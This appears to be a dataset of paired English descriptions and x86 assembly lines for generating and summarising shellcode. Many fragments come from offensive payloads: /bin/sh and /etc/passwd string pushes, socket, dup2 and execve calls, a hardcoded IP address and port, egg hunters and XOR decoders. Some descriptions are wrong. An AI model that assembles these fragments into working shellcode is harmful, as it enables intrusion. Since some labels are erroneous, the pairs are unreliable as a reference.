ShellCodeGen: decrement the eax register by one,dec eax
ShellCodeGen: move 123 into the effective address saved in ebx,"mov [ebx], 123"
ShellCodeGen: init edi 0,"xor edi, edi"
ShellCodeGen: subtract the contents of esi from the 32-bit integer stored at memory location var,"sub [var], esi"
ShellCodeGen: invoke sys_fork,"mov eax, 2"
ShellCodeGen: move 100 into cl,"mov cl, 100"
"ShellCodeSum: lea ebx, [zero_reg+3]",load the effective address of the result of the operation [zero_reg+3] into the ebx register
ShellCodeGen: push 0x782f2f32 to the stack,push 0x782f2f32
"ShellCodeSum: shl edx, 9",left shift the contents of edx register by 9 bit positions
ShellCodeSum: pop esi,pop the value on the stack back into esi
"ShellCodeSum: push 0x69622f2f \n mov edx, esp",push the value 0x69622f2f onto the stack and point the edx register to the stack register
ShellCodeGen: push the dword 0x6164732f onto the stack,push dword 0x6164732f
"ShellCodeSum: lea ebx, [edx+0x4]",load the effective address of edx+0x4 into ebx
ShellCodeSum: push 0xdebf,push 0xdebf value to the stack
ShellCodeSum: jne short _while_loop,jump to the _while_loop label if the operands of the above comparison are not equals
ShellCodeGen: jump short to the four label,jmp short four
ShellCodeGen: section data,section .data
ShellCodeGen: load the effective address of ebx+8 into ecx,"lea ecx, [ebx+8]"
ShellCodeGen: push the dword 0x0501a8c0 onto the stack,push dword 0x0501a8c0
ShellCodeGen: if not zero jump to loc_4010e5,jnz short loc_4010e5
"ShellCodeSum: mov eax, 0xfeffff80",move 0xfeffff80 into eax
ShellCodeGen: make the system call to suspend the process,"mov eax, 29"
"ShellCodeSum: xor eax, eax",zero out eax
ShellCodeSum: push byte 25 \n pop eax,put the syscall 25 into the eax register
ShellCodeGen: increment the contents of the esp register,inc esp
ShellCodeGen: perform the or operation between the eax register and 0xffffffff,"or eax, 0xffffffff"
"ShellCodeSum: mov ebx, buff",move buff to ebx
"ShellCodeSum: cmp BYTE al, 2 \n je do_inject \n jmp while",jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label
ShellCodeGen: define fupdisasm function,fupdisasm:
ShellCodeSum: not ecx,negate all the bits of the ecx register
ShellCodeGen: move the contents at memory specified by temp into eax,"mov eax, [temp]"
ShellCodeGen: call _malloc,call _malloc
"ShellCodeSum: cmp eax, ebx \n jne retry",jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register
"ShellCodeSum: test eax, eax",perform a bitwise and on the contents of the eax register
ShellCodeGen: push 0x65782e2f onto the stack,push 0x65782e2f
ShellCodeSum: push ebx,push ebx on the stack
ShellCodeSum: push byte 16,push the byte 16 onto the stack
ShellCodeGen: push the word 0x3905 onto the stack,push word 0x3905
ShellCodeGen: init eax 0,"xor eax, eax"
ShellCodeSum: section .bss,declare the bss section
"ShellCodeSum: sub al, 88",subtract 88 from the contents of the al register
ShellCodeSum: jmp edi,jump to the edi label
ShellCodeSum: push 0x782f2f32,push 0x782f2f32 to the stack
ShellCodeGen: multiply edx by 2 using left shift,"shl edx, 1"
ShellCodeSum: push 0x10,push 0x10 to the stack
ShellCodeGen: call the esi function,call esi
ShellCodeGen: compare the contents of the ebp register with the value 0,"cmp ebp, 0"
"ShellCodeSum: xor dl, 0xbb",perform the xor operation between dl and 0xbb and store the result in dl
ShellCodeSum: addr: db 0x1,define the byte addr and initialize it to 0x1
"ShellCodeSum: mov ebx, x",move the contents of x into ebx
ShellCodeGen: define number variable of a word and initialize to 12345,number dw 12345
ShellCodeSum: mul edx,mul eax by edx
"ShellCodeSum: sub cx, 0x7ff",subtract 0x7ff from the contents of cx register value and save the result in cx
ShellCodeGen: move donemsg into ecx,"mov ecx, donemsg"
"ShellCodeSum: xor edx, edx",initialize edx with the hexadecimal value 0x0
ShellCodeGen: move _start into eax,"mov eax, _start"
"ShellCodeSum: xor cl, 0xaa",perform the xor operation between cl and 0xaa and store the result in cl
ShellCodeGen: move the contents of the al register at the memory location specified by the operation [bp+0x31]],"mov [bp+0x31], al"
"ShellCodeSum: sub esp, 0x28",subtract the value 0x28 from the esp register
"ShellCodeSum: cmp eax, ebx \n je exit \n add al, 0x3",if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
ShellCodeSum: push_cmd:,declare push_cmd label
"ShellCodeSum: push dword 0x39396e2d \n mov ebp, esp",push double word 0x39396e2d onto the stack and point the ebp register to the stack register
ShellCodeGen: push double word 0x39396e2d onto the stack and point the ebp register to the stack register,"push dword 0x39396e2d \n mov ebp, esp"
"ShellCodeSum: mov esi, eax",move pointer in eax into esi
"ShellCodeSum: cmp edx, ebx \n je 0x8 \n",jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register
ShellCodeGen: push the byte 9 onto the stack,push byte 9
"ShellCodeSum: mov al, byte 2ah",move the byte 2ah into al
"ShellCodeSum: mov al, byte 66h",move the byte at the address 66h into al
ShellCodeGen: move value of memory address [ebp+8] into eax,"mov eax, [ebp+8]"
ShellCodeGen: make the system call waitpid,"mov eax, 7"
"ShellCodeSum: cmp bl, 78h \n jle short loc_402B1D",if the contents of the bl register is less than or equal to the value 78h then jump to the memory location loc_402B1D
"ShellCodeSum: lea ecx, [ebx+8]",load the effective address of ebx+8 into ecx
"ShellCodeSum: lea ecx, [ebp+28]",load the effective address of the result of the operation [ebp+28] into the ecx register
ShellCodeSum: push esi,push esi on the stack
"ShellCodeSum: push 0x64687373 \n mov esi, esp",push the value 0x64687373 onto the stack and point the esi register to the stack register
ShellCodeGen: jump to label _accept,jmp _accept
ShellCodeGen: define the _isegg label,_isegg:
ShellCodeGen: load the effective address of esp into the ecx register,"lea ecx, [esp]"
ShellCodeGen: move value of 1 into register ax,"mov ax, 1"
"ShellCodeSum: mov eax, [z]",move the contents at memory specified by z to eax
"ShellCodeSum: sub ecx, ecx",subtract the contents of the ecx register from the contents of the ecx register
ShellCodeGen: add esi into memory address ebp-4,"add [ebp-4], esi"
ShellCodeGen: move 39 into al,"mov al, 39"
ShellCodeGen: subtract 88 from the contents of the al register,"sub al, 88"
"ShellCodeSum: push ebx \n mov edx, esp",push the contents of the ebx register onto the stack and point edx to the stack register
ShellCodeGen: move linefeed character into eax,"mov eax, 0ah"
ShellCodeGen: push 0x76766c2d onto the stack,push 0x76766c2d
"ShellCodeSum: sub bl, 0x7",subtract 0x7 from bl and save the result into bl
ShellCodeGen: move the contents of ecx into the memory location specified by the operation [ebp+12],"mov [ebp+12], ecx"
ShellCodeGen: if the contents of the eax register is zero then jump to the label ready_to_proxy,"test eax, eax \n jz ready_to_proxy"
ShellCodeSum: push word 0x8223,push the word 0x8223 onto the stack
"ShellCodeSum: sar ecx, 2",right shift the value of register ecx by 2 bits
ShellCodeGen: move 0x31263e32 into eax,"mov eax, 0x31263e32"
ShellCodeGen: specify sys_read call,"mov eax, 3"
"ShellCodeSum: mov edi, ecx",move ecx into edi
ShellCodeSum: pop ebx,restore the original value of ebx
ShellCodeSum: push 0x7372656f,push 0x7372656f to the stack
ShellCodeGen: push 0x6769666e onto the stack,push 0x6769666e
ShellCodeGen: mmap,"mov eax, 90"
"ShellCodeSum: xor eax, eax",reset eax
ShellCodeSum: jns duploop,jump to duploop if not negative
"ShellCodeSum: mov edx, 255",move decimal number 255 into edx
"ShellCodeSum: cmp dl, 27 \n jg l3",if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
"ShellCodeSum: mov [esp+57], al",move al into the address [esp+57]
"ShellCodeSum: lea ecx, [esi+18]",load the effective address of the result of the operation [esi+18] into the ecx register
ShellCodeSum: popad,pop doublewords from the stack into the 32 bit registers
ShellCodeGen: zero out the eax register and the ebx register,"xor ebx, ebx \n mul ebx"
ShellCodeGen: push the value 0x6374652f onto the stack and point ebx to the stack register,"push 0x6374652f \n mov ebx, esp"
ShellCodeSum: global _start,declare _start as global label
ShellCodeGen: jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD,"cmp byte [esi], 0xD \n jle wrap_around"
ShellCodeGen: jump to the edi label,jmp edi
ShellCodeSum: createfile:,define createfile function
ShellCodeSum: jne 80480aa,jump to 80480aa if not equal
ShellCodeGen: push 0x73644d24 onto the stack,push 0x73644d24
ShellCodeSum: jz child,jump to label child if the zero flag is set
"ShellCodeSum: mov byte al, 0xa4",move 0xa4 into the byte at address al
ShellCodeGen: push the byte 0x30 onto the stack,push byte 0x30
ShellCodeSum: call_shellcode:,define call_shellcode label
ShellCodeGen: push the byte 70 onto the stack,push byte 70
ShellCodeGen: move the value 0x1234567 into the edx register,"mov edx, 0x1234567"
ShellCodeSum: push 20,push 20 onto the stack
ShellCodeGen: move ebx into the address [esi+43],"mov [esi+43], ebx"
"ShellCodeSum: push word 0x662d \n mov esi, esp",push the word 0x662d onto the stack and point the esi register to the stack register
ShellCodeSum: jl wrap_around,jump to the wrap_around label if the destination operand is less than the source operand in the above comparison
"ShellCodeSum: mov al, 66h",move 66h into al
"ShellCodeGen: define shellcode as an array of bytes and initialize it to 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23","shellcode: db 0x4b,0xf7,0x13,0x59,0xcc,0x8c,0x63,0x5e,0x9f,0x8d,0x99,0x9f,0x1f,0xa4,0x3b,0x6e,0xc6,0x36,0x23"
ShellCodeGen: move the contents at memory address y to ebx,"mov ebx, [y]"
ShellCodeGen: move the value 0xfee1dead into the ebx register,"mov ebx, 0xfee1dead"
ShellCodeSum: jmp nextarg,jump to nextarg label
"ShellCodeSum: sub ecx, 0x1525152a",subtract 0x1525152a from the contents in ecx and save the result in ecx
ShellCodeSum: two:,declare the two label
"ShellCodeSum: mov eax, 8",invoke sys_creat
ShellCodeGen: push the word 0x5974 onto the stack,push word 0x5974
ShellCodeGen: load the effective address of the result of the operation [esi+18] into the ecx register,"lea ecx, [esi+18]"
ShellCodeSum: an_integer dd 12425,define the doubleword an_integer and initialize it to 12425
ShellCodeSum: push 0x65782e2f,push 0x65782e2f to the stack
ShellCodeSum: div dword [var],divide the contents of in eax by by the word value stored at memory location var
ShellCodeGen: return to the address on the top of the stack,ret
ShellCodeSum: jb modtest,jump to label modtest if below
ShellCodeGen: load the effective address of the result of the operation [zero_reg+3] into the ebx register,"lea ebx, [zero_reg+3]"
ShellCodeGen: define size to be 1024 bytes large,size: equ 1024
ShellCodeGen: jump short to cycle label,jmp short cycle
ShellCodeGen: copy the 4 byte at memory location specified by the the result of the operation ebx+8 into eax register,"mov eax, [ebx+8]"
"ShellCodeSum: push 0x2f2f2f2f \n mov eax, esp",push the value 0x2f2f2f2f onto the stack and point eax to the stack register
ShellCodeGen: move variable len to edx,"mov edx, len"
ShellCodeSum: push word 0x662d,push the word 0x662d onto the stack
ShellCodeGen: system call pause,"mov eax, 29"
ShellCodeGen: move eax into ecx,"mov ecx, eax"
ShellCodeGen: save old base pointer,push ebp
"ShellCodeSum: cmp ecx, ebp",compare ecx and ebp
ShellCodeGen: declare the formatting label,formatting:
ShellCodeGen: if the contents of the eax register is zero then jump short to the memory location loc_402B13,"test eax, eax \n jz short loc_402B13"
ShellCodeGen: allocate memory for a variable,"sub esp, 4"
ShellCodeGen: move 1 into eax,"mov eax, 1"
ShellCodeGen: clear the edx register and push its contents onto the stack,"xor edx, edx \n push edx"
ShellCodeSum: push word 0x632d,push the word 0x632d onto the stack
ShellCodeGen: push the word 0x3905 to the stack,push word 0x3905
ShellCodeGen: move 0700 into cx,"mov cx, 0700"
ShellCodeSum: push sock_reg,push the sock_reg onto the stack
ShellCodeSum: push 0x68732f2f,push the value 0x68732f2f onto the stack
ShellCodeGen: move the contents at memory specified by y to eax,"mov eax, [y]"
"ShellCodeSum: mov eax, esp",move stack pointer to eax
ShellCodeGen: push 0x2f656c2d onto the stack,push 0x2f656c2d
"ShellCodeSum: cmp eax, ebx \n je 0x47",jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
ShellCodeSum: loop main_push,decrement ecx and jumps to the main_push label unless decrementing ecx caused its value to become zero
ShellCodeGen: move 0x6 into al,"mov al, 0x6"
"ShellCodeSum: add esp, 0x20",add 0x20 to the contents in esp and save the result in esp
"ShellCodeSum: xor ax, 0x539 \n jz decoded_shellcode",jump to the decoded_shellcode label if the result of the logical xor between the ax register and the value 0x539 is zero
ShellCodeGen: jump to the decode label if the zero flag is cleared,jnz decode
ShellCodeGen: jump to the jocker label,jmp jocker
"ShellCodeSum: mov ebx, upcase",move the value of upcase into ebx
"ShellCodeSum: mov eax, 29",system call pause
ShellCodeGen: push 0x68732f6e to the stack,push 0x68732f6e
"ShellCodeSum: xor edx, edx \n push edx",clear the edx register and push its contents onto the stack
ShellCodeSum: push 0x37373333,push 0x37373333 to the stack
ShellCodeSum: section .data,declare data section
ShellCodeGen: negate all the bits of the edi register,not edi
ShellCodeGen: add the byte value 2 to the esi register,"add byte [esi], 2"
ShellCodeGen: jump to label write if below,jb write
"ShellCodeSum: xor eax, 0x58494741",perform a logical xor between the eax register and 0x58494741 and save the result in eax
"ShellCodeSum: xor ecx, ecx \n cmp ebx, ecx \n jne l1",zero out the ecx register and jump to the l1 label if the contents of the ebx register is not equal to the contents of the ecx register
ShellCodeGen: move 0x11 into the byte at address [esp+3],"mov byte [esp+3], 0x11"
ShellCodeSum: push 0x31313131,push 0x31313131 onto the stack
ShellCodeGen: pop the value on the stack back into edx,pop edx
ShellCodeSum: call set_argv,call the set_argv function
"ShellCodeSum: mov ecx, esp",move the address of the stack pointer into ecx
"ShellCodeSum: mov bh, 0x12",move 0x12 into bh
ShellCodeGen: add 4 to eax,"add eax, 4"
ShellCodeSum: push byte 0x77 \n pop eax,put the syscall 0x77 into the eax register
"ShellCodeSum: cmp dl, 27 \n jge l3",jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27
"ShellCodeSum: mov ebx, 0x2",move 0x2 into ebx
ShellCodeSum: push dword 0x74652f2f,push the dword 0x74652f2f onto the stack
ShellCodeSum: 2:,define the label 2
"ShellCodeSum: mov [ecx+4], eax",move eax into the address [ecx+4]
ShellCodeSum: not byte [esi],perform a bit-wise inversion of the byte starting at the address in esi
ShellCodeGen: move 0x2e into the byte in esp,"mov byte [esp], 0x2e"
ShellCodeSum: push 0x79616c70,push 0x79616c70 onto the stack
"ShellCodeSum: xor byte [esi], 0x2c",perform the xor operation between the byte starting at the addess in esi and the value 0x2c
ShellCodeSum: section .text,declare .text section
ShellCodeGen: move the first element in array2 into ecx,"mov ecx, array2"
ShellCodeSum: push 0x6e69622f,push the 0x6e69622f onto the stack
ShellCodeGen: move the contents of al into the byte at the memory location specified by the operation [esi+17],"mov byte [esi+17],al"
ShellCodeGen: move the value 0x1 into the al register,"mov al, 0x1"
"ShellCodeSum: mov esi, 0x243525f0",move 0x243525f0 into esi
ShellCodeSum: push byte -1,push the byte -1 onto the stack
ShellCodeGen: add 0x30 to esi,"add esi, 0x30"
ShellCodeGen: put the syscall 37 into the eax register,push byte 37 \n pop eax
"ShellCodeSum: mov ebx, 0x4",move 0x4 into ebx
ShellCodeGen: invoke sys_lseek,"mov eax, 19"
ShellCodeGen: push the dword 0x6962732f onto the stack,push dword 0x6962732f
"ShellCodeSum: mov al, 39",move 39 into al
ShellCodeGen: compare the dx value with zero,"cmp dx, 00"
ShellCodeGen: jump short to the _parent label if the zero flag is cleared,jnz short _parent
ShellCodeSum: push dword 0x2f2f6e69,push the dword 0x2f2f6e69 onto the stack
"ShellCodeSum: cmp ecx, 0",compare ecx to 0
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov edx, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
ShellCodeGen: push the contents of the ecx register onto the stack.,push ecx
ShellCodeGen: move 2 into the single byte at the address stored in ebx,"mov byte [ebx], 2"
ShellCodeGen: jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register,"cmp eax, ebx \n je L1"
ShellCodeSum: inc ax,increment ax
ShellCodeSum: push byte 0x05 \n pop eax,put the syscall 0x05 into the eax register
ShellCodeGen: zero out ebx,"xor ebx, ebx"
ShellCodeGen: jump to the _start label if the zero flag is set,jz _start
ShellCodeGen: set signal delivery alarm clock,"mov eax, 27"
ShellCodeGen: push 0x66 onto the stack,push 0x66
ShellCodeGen: move the byte in eax into cl,"mov cl, byte [eax]"
ShellCodeGen: jump to decode_pr if not signed,jns decode_pr
ShellCodeGen: move 0x33 into al,"mov al, 0x33"
"ShellCodeSum: cmp dword [eax-4], egg2 \n je _next \n jmp eax",jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
"ShellCodeSum: mov ebx, 5",invoke subroutine accept
"ShellCodeSum: mov al, 16",move 16 into al
"ShellCodeSum: cmp al, 0x38 \n je 0x40 \n push byte 0x1",if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
ShellCodeGen: jump short to the formatting label,jmp short formatting
"ShellCodeSum: push word 0x662d \n mov edi, esp",push the word 0x662d onto the stack and point the edi register to the stack register
ShellCodeGen: push the byte 1 to the stack,push byte 1
ShellCodeSum: call loader,call the loader function
"ShellCodeSum: sub esp, byte 0x1",subtract the byte 0x1 from the contents of the esp register
"ShellCodeSum: cmp bl, al \n je loop_2",if the contents of the bl register is equal to the contents of the al register then jump to the loop_2 label
ShellCodeGen: jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register,"cmp dword [eax-4], egg1 \n jne _next \n jmp eax"
ShellCodeGen: push the byte 0x11 onto the stack and point ebx to the stack register,"push byte 0x11 \n mov ebx, esp"
ShellCodeGen: decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label,loopnz L1 \n jmp shellcode
ShellCodeGen: move ASCII /bin/sh into edx,"push 0x68732f2f \n push 0x6e69622f \n mov edx, esp"
ShellCodeGen: subtract 0x10 from eax,"sub eax, 0x10"
ShellCodeGen: move the address of msg3 into eax,"mov eax, msg3"
"ShellCodeSum: lea ebx, [esp +1]",load the effective address [esp+1] into ebx
ShellCodeSum: push 0x2f3a706d,push 0x2f3a706d onto the stack
ShellCodeSum: inc bx,increment the contents of the bx register
ShellCodeGen: put the syscall 25 into the eax register,push byte 25 \n pop eax
ShellCodeGen: add ecx to edx,"add edx, ecx"
ShellCodeSum: pop esi,restore esi from the stack
ShellCodeGen: define label re,re
ShellCodeSum: name db 30 dup,allocate memory for 30 bytes uninitialized name variable
ShellCodeSum: mul ecx,mutliply eax by ecx
ShellCodeSum: push word 0x5974,push the word 0x5974 onto the stack
ShellCodeGen: perform a logical xor between the eax register and the esi register and save the result in eax,"xor eax, esi"
ShellCodeSum: init:,declare the init label
ShellCodeSum: push edx,push the contents of edx register onto the stack
"ShellCodeSum: mov edx, 2",move decimal 2 into edx
ShellCodeSum: dec ecx \n jns dup2loop,decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0
ShellCodeGen: push the byte 0x64 onto the stack,push byte 0x64
"ShellCodeSum: lea eax, [ebx+17h]",load the effective address of the result of the operation [ebx+17h] into the eax register
ShellCodeGen: move al into the single byte at the address stored in edx+ecx,"mov byte [edx+ecx],al"
ShellCodeSum: _file:,define the _file label
ShellCodeGen: left shift the contents of ebx by 8 bits,"shl ebx, 8"
ShellCodeSum: call doit,call the doit function
"ShellCodeSum: sub ebx, 0x2e2aa163",subtract 0x2e2aa163 from ebx and save the result into ebx
"ShellCodeSum: cmp cl, dl \n je EncodedShellcode",if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label
"ShellCodeSum: mov edx, response",move address of response variable into edx
ShellCodeGen: define a byte and initialize it to 0xdeadbeef,dd 0xdeadbeef
"ShellCodeSum: mov bl, al \n sub bl, 2 \n jnz loop",move the contents of the al register into the contents of the bl register then subtract the value 2 from the cl register and jump to the loop label if the result is not zero
ShellCodeSum: push ebp,push ebp onto the stack
ShellCodeGen: decrement ecx and jumps to the fill label unless decrementing ecx caused its value to become zero,loop fill
ShellCodeGen: define the _execline label,_execline:
"ShellCodeSum: shr [var], 3",right shift by 3 bit positions the contents of var variable
ShellCodeGen: zero out the edx register and jump to the l2 label if the contents of the ecx register is not equal to the contents of the edx register,"xor edx, edx \n cmp ecx, edx \n jne l2"
ShellCodeGen: define the byte string '/sbin/insmod#/tmp/o.o',db '/sbin/insmod#/tmp/o.o'
ShellCodeGen: negate all the bits of the esi register,not esi
ShellCodeGen: restore the top of the stack into the cx register,pop cx
"ShellCodeSum: xor [ecx + 116], bh",perform a logical xor between the address speicified by [ecx + 116] and the bh register and save the result in [ecx + 116]
ShellCodeGen: file descriptor 1 standard output,"mov ebx, 1"
"ShellCodeSum: mov byte [esi+21], al",move al into the byte at address [esi+21]
ShellCodeGen: if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register,"cmp BYTE [esi], 0x7 \n jl lowbound \n sub BYTE [esi], 0x7"
"ShellCodeSum: mov esi, var",copy the address of var into esi
"ShellCodeSum: add ax, bx",add the contents of bx into ax
ShellCodeGen: put the address of ebx+8 into eax,"lea eax, [ebx+8]"
"ShellCodeSum: or eax, 0xffffffff",perform the or operation between the eax register and 0xffffffff
"ShellCodeSum: mov dl, 0x09",move 0x09 into dl
"ShellCodeGen: define port as an array of bytes and initialize it to 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77","port: db 0xd4, 0x31, 0xc0, 0xa8, 0x3, 0x77"
"ShellCodeSum: sub ecx, 23",subtract 23 from the contents of the ecx register
ShellCodeGen: jump short to the shellcode label,jmp short shellcode
"ShellCodeSum: mov edx, donelen",move donelen into edx
"ShellCodeSum: push 0x7461632f \n push 0x6e69622f \n mov eax, esp",push the value 0x7461632f and the value 0x6e69622f onto the stack and point the eax register to the stack register
"ShellCodeSum: sub byte [buff],20h",subtract 20h from the 8-bit at memory location buff
ShellCodeSum: decoder:,declare the decoder label
ShellCodeGen: make the systemcall socketcall,"mov al, 0x66"
"ShellCodeSum: test eax, eax \n jz socket",jump to the label socket if the contents of the eax register is zero
"ShellCodeSum: mov ecx, buff",move buff to ecx
ShellCodeGen: right shift the contents of eax by 31 bits,"sar eax, 31"
"ShellCodeSum: mov ecx, type var2",move the number of bytes of var2 into ecx
ShellCodeSum: push word 0x3582,push the word 0x3582 onto the stack
ShellCodeGen: decrement the ecx register and jump to the do_dup label if the contents of the ecx register is not zero else push the byte 0x3f onto the stack,loop do_dup \n push byte 0x3f
"ShellCodeSum: sub esp, 12",subtract 12 from esp register and save the result in esp
ShellCodeGen: pop the top element of the stack into memory at the four bytes starting at location ebx,pop [ebx]
ShellCodeSum: loop up,decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
ShellCodeSum: push 0x782f6e69,push 0x782f6e69 to the stack
ShellCodeSum: push byte 10,push the byte 10 onto the stack
"ShellCodeSum: mov eax, 90",mmap
"ShellCodeSum: mov [ebp+20], zero_reg",move zero_reg into the address [ebp+20]
ShellCodeSum: global _start,declare global _start
"ShellCodeSum: mov ebx, 1",file descriptor 1 standard output
"ShellCodeSum: push 0x61702f2f \n push 0x6374652f \n mov ebx, esp",push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
ShellCodeGen: push the byte 0x1 onto the stack and point ecx to the stack register,"push byte 0x1 \n mov ecx, esp"
ShellCodeSum: push 0x30,push the value 0x30 onto the stack
"ShellCodeSum: xor al, 0x4a",perform the xor operation between the al register and the value 0x4a
ShellCodeSum: push byte 37 \n pop eax,put the syscall 37 into the eax register
"ShellCodeSum: cmp byte [esi], 0x7",compare the byte in esi with 0x7
ShellCodeSum: push 0x10,push the 0x10 onto the stack
ShellCodeGen: define fill label,fill:
ShellCodeGen: move address of stack pointer into ebx,"mov ebx, esp"
"ShellCodeSum: mov ecx, buffer",move the memory address of buffer variable into ecx
"ShellCodeSum: sub bx, 1663",subtract the contents of bx register by 1663 and save the result in bx
ShellCodeSum: dec edx,decrement edx
ShellCodeSum: mul ebx,multiply eax by the contents of the ebx register
ShellCodeGen: push the word 0x6d6f onto the stack,push word 0x6d6f
"ShellCodeSum: marks dw 0, 0, 0, 0",allocate memory for the marks array of words and initialize all elements to zero
ShellCodeSum: push byte 0x1,push the byte 0x1 to the stack
ShellCodeSum: div ebx,divide eax by ebx
ShellCodeGen: swap the contents of the esi register with the contents of the eax register,"xchg esi, eax"
ShellCodeGen: jump to the l00p label if the zero flag is cleared,jnz l00p
ShellCodeGen: move the value 0x6b2f7379 into the double word starting at the address [esp-0x20],"mov dword [esp-0x20], 0x6b2f7379"
ShellCodeSum: push bx,push bx to the stack
ShellCodeSum: word2 sword 32768,define word2 signed word and initialize it to -32768
ShellCodeGen: define the word value word_value and initialize it to 300,word_value dw 300
ShellCodeGen: declare the find_egg label,find_egg:
ShellCodeGen: push the byte 4 onto the stack,push byte 4
"ShellCodeSum: add eax, 48",add 48 to eax
"ShellCodeSum: mov byte al, 0xa4",move 0xa4 into the byte in al
"ShellCodeSum: xor byte [esi], cl",perform a logical xor between the byte at the address specified by [esi] and the cl register and save the result in [esi]
ShellCodeGen: decrement the ecx register and jump to the l4 label if the contents of the ecx register is not zero else move the contents of the esp register into the edx register,"loop l4 \n mov edx, esp"
"ShellCodeSum: add [ebp-4], esi",add esi into memory address ebp-4
ShellCodeSum: number: resb 1,reserve 1 byte for number variable
ShellCodeGen: jump short to the process_shellcode label,jmp short process_shellcode
ShellCodeGen: move 0x5309 into cx,"mov cx, 0x5309"
"ShellCodeSum: cmp bl, 0xbb \n je xordecode \n jmp notdecode",if the contents of the bl register is equal to the value 0xbb then jump to the xordecode label else jump to the notdecode label
"ShellCodeSum: or al, syscall_execve",perform or operation between the al register and syscall_execve
ShellCodeGen: if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label,"cmp cl, 0x3 \n jne loop2"
ShellCodeGen: restore edx from the value we pushed onto the stack at the start,pop edx
"ShellCodeSum: cmp edx, 0",compare if edx is zero
ShellCodeGen: add the contents of eax to the contents of edx,"add edx, eax"
ShellCodeGen: zero out the edx register and jump to the l2 label if the contents of the ecx register is equal to the contents of the edx register,"xor edx, edx \n cmp ecx, edx \n je l2"
ShellCodeGen: add 3 to the contents of esp,"add esp, 3"
ShellCodeGen: make kernel call to exit program,int 80h
"ShellCodeSum: test eax, eax \n jz socket \n xor eax, eax",jump to the label socket if the contents of the eax register is zero else zero out the contents of the eax register
ShellCodeGen: negate all the bits of ax register,not ax
ShellCodeGen: move 0xb33fb33f into eax,"mov eax, 0xb33fb33f"
ShellCodeGen: declare the doit label,doit:
"ShellCodeSum: mov ebx, edx",move edx into ebx
ShellCodeGen: make the system call execve,"mov eax, 11"
"ShellCodeSum: cmp bl, 78h \n jg short loc_402B1D",if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D
"ShellCodeSum: sub bl,byte [esi]",subtract the byte in esi from the bl register
ShellCodeSum: jmp short _load_data,jump short to the _load_data label
ShellCodeSum: push byte 2,push the byte 2 onto the stack
"ShellCodeSum: push eax \n mov ebx, esp",push the contents of the eax register onto the stack and point ebx to the stack register
ShellCodeGen: jump to label stop if equal,je stop
ShellCodeGen: jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h,"cmp bl, 78h \n jle short loc_402B1D"
ShellCodeGen: move bx to count,"mov count, bx"
"ShellCodeSum: cmp bl, 0x1f",compare the contents of bl and 0x1f
"ShellCodeSum: xor byte [esi + ecx - 1], 0x3",perform a logical xor between the byte at the address speicified by [esi + ecx - 1] and the bh register and save the result in [esi + ecx - 1]
ShellCodeGen: right shift the value of register edx by 4 bits,"sar edx, 4"
ShellCodeSum: inc dl,increment dl register
ShellCodeGen: add 16 to ecx,"add ecx, 16"
ShellCodeSum: push byte 11,push the byte 11 onto the stack
ShellCodeGen: push the dword 0x017aa8c0 onto the stack,push dword 0x017aa8c0
ShellCodeGen: push the word 0x3636 onto the stack,push word 0x3636
"ShellCodeSum: mov eax, 63",system call dup2
ShellCodeSum: push 0x6d726574,push 0x6d726574 to the stack
ShellCodeGen: if the unsigned contents of the al register is lower than the unsigned contents of the bl register then jump to the label l2,"cmp al, bl \n jb l2"
"ShellCodeSum: add esi, eax",add eax to esi
ShellCodeSum: jmp short exi,jump short to exi label
ShellCodeSum: pop dx,pop the value on the stack back into dx
ShellCodeSum: push ecx,push the value of register ecx onto the stack
ShellCodeGen: getpgrp,"mov eax, 65"
ShellCodeSum: execute:,declare the execute label
"ShellCodeSum: lea eax, [ecx+4]",load the effective address of the result of the operation [ecx+4] into the eax register
"ShellCodeSum: mov byte [esi+ecx], bl",move bl into the single byte at the address stored in esi+ecx
ShellCodeGen: push the dword 0x68732f2f onto the stack,push dword 0x68732f2f
"ShellCodeSum: mov eax, 0x50905090",move 0x50905090 into eax
"ShellCodeSum: mov eax, _start",move _start into eax
ShellCodeSum: jmp short call_shellcode,jump short to the call_shellcode label
"ShellCodeSum: test eax, eax \n jz close \n mov ebx, edx",jump to the label close if the contents of the eax register is zero else move the contents of the edx register into the ebx register
ShellCodeGen: push 2 onto stack,push word 2
ShellCodeGen: define the _load_data label,_load_data:
ShellCodeGen: decrement the contents of the ecx register,dec ecx
ShellCodeGen: move esp into the address [esp+4],"mov [esp+4], esp"
ShellCodeSum: push cx,push the contents of the cx register onto the stack
ShellCodeSum: jnz l00p,jump to the l00p label if the zero flag is cleared
"ShellCodeSum: mov al, 0x17",move 0x17 into al
"ShellCodeSum: mov al, byte 6h",move the byte 6h into al
ShellCodeSum: loopnz next2 \n jmp edi,decrement the ecx register and jump to the next2 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the edi register
ShellCodeGen: push the byte 0x1c onto the stack,push byte 0x1c
